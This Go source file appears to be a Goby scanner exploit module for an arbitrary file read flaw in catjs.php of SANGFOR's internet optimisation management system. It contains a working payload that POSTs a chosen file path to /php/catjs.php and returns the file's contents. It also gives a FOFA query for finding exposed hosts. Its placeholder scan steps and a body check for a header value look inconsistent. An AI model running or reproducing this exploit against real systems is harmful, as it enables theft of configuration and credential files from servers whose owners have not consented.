package exploits

import (
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "SANGFOR-IOMS catjs.php File Read Vulnerability",
    "Description": "<p>Convinced by the Internet optimization management system deployment does not need to be adjusted, and transparent bridging mode is supported in organizational networks. At the same time, Intranet users can directly access the Internet regardless of any changes and maintain the original Internet access habits. This enables all data centers, links, and servers to be fully utilized.</p><p>catjs.php file has any file reading vulnerability, through which an attacker can download any file in the server and leak sensitive information of the server.</p>",
    "Impact": "<p>Attackers can use this vulnerability to read important server files, such as system configuration files, database configuration files, and so on, causing the website to be in an extremely insecure state.</p>",
    "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time: <a href=\"https://www.sangfor.com.cn\">https://www.sangfor.com.cn</a></p>",
    "Product": "SANGFOR-IOMS",
    "VulType": [
        "File Read"
    ],
    "Tags": [
        "File Read"
    ],
    "Translation": {
        "CN": {
            "Name": "深信服上网优化管理系统 catjs.php 文件读取漏洞",
            "Product": "SANGFOR-IOMS",
            "Description": "<p>深信服上网优化管理系统无需调整网络部署,支持以网桥模式透明串接在组织网络中;同时内网用户无视任何变动,保持原有上网习惯即可直接上网、立即加速，使所有的数据中心、链路和服务器都得到充分利用。</p><p>其中 catjs.php 文件存在任意文件读取漏洞，攻击者通过漏洞可以下载服务器中的任意文件，泄漏服务器敏感信息。<br></p>",
            "Recommendation": "<p>厂商已发布了漏洞修复程序，请及时关注更新：&nbsp;<a href=\"https://www.sangfor.com.cn\">https://www.sangfor.com.cn</a><br></p>",
            "Impact": "<p>攻击者可通过该漏洞读取服务器重要文件，如系统配置文件、数据库配置文件等等，导致网站处于极度不安全的状态。<br></p>",
            "VulType": [
                "文件读取"
            ],
            "Tags": [
                "文件读取"
            ]
        },
        "EN": {
            "Name": "SANGFOR-IOMS catjs.php File Read Vulnerability",
            "Product": "SANGFOR-IOMS",
            "Description": "<p>Convinced by the Internet optimization management system deployment does not need to be adjusted, and transparent bridging mode is supported in organizational networks. At the same time, Intranet users can directly access the Internet regardless of any changes and maintain the original Internet access habits. This enables all data centers, links, and servers to be fully utilized.</p><p>catjs.php file has any file reading vulnerability, through which an attacker can download any file in the server and leak sensitive information of the server.<br></p>",
            "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time:&nbsp;<a href=\"https://www.sangfor.com.cn\">https://www.sangfor.com.cn</a><br></p>",
            "Impact": "<p>Attackers can use this vulnerability to read important server files, such as system configuration files, database configuration files, and so on, causing the website to be in an extremely insecure state.<br></p>",
            "VulType": [
                "File Read"
            ],
            "Tags": [
                "File Read"
            ]
        }
    },
    "FofaQuery": "title=\"SANGFOR上网优化管理\"",
    "GobyQuery": "title=\"SANGFOR上网优化管理\"",
    "Author": "1171373465@qq.com",
    "Homepage": "https://www.sangfor.com.cn/",
    "DisclosureDate": "2022-03-23",
    "References": [],
    "HasExp": true,
    "Is0day": false,
    "Level": "2",
    "CVSS": "7.0",
    "CVEIDs": [],
    "CNVD": [],
    "CNNVD": [],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [
        {
            "name": "filePath",
            "type": "input",
            "value": "./php/catjs.php",
            "show": ""
        }
    ],
    "ExpTips": {
        "type": "",
        "content": ""
    },
    "AttackSurfaces": {
        "Application": [],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "CVSSScore": "6.0",
    "PostTime": "2023-07-19",
    "PocId": "10806"
}`
	sendPayload46844767146 := func(hostInfo *httpclient.FixUrl, filePath string) string {
		uri := "/php/catjs.php"
		cfg := httpclient.NewPostRequestConfig(uri)
		cfg.Data = fmt.Sprintf(`["%s"]`, filePath)
		cfg.VerifyTls = false
		cfg.FollowRedirect = false
		cfg.Header.Store("Content-type", "application/x-www-form-urlencoded")
		resp, err := httpclient.DoHttpRequest(hostInfo, cfg)
		if err != nil || resp.StatusCode != 200 || !strings.Contains(resp.HeaderString.String(), "application/x-javascript") {
			return ""
		}
		return resp.Utf8Html
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			respHtml := sendPayload46844767146(hostInfo, "./php/catjs.php")
			return strings.Contains(respHtml, "application/x-javascript") && strings.Contains(respHtml, "file_get_contents")
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			filePath := ss.Params["filePath"].(string)
			respHtml := sendPayload46844767146(expResult.HostInfo, filePath)
			expResult.Output = respHtml
			expResult.Success = true
			return expResult
		},
	))
}
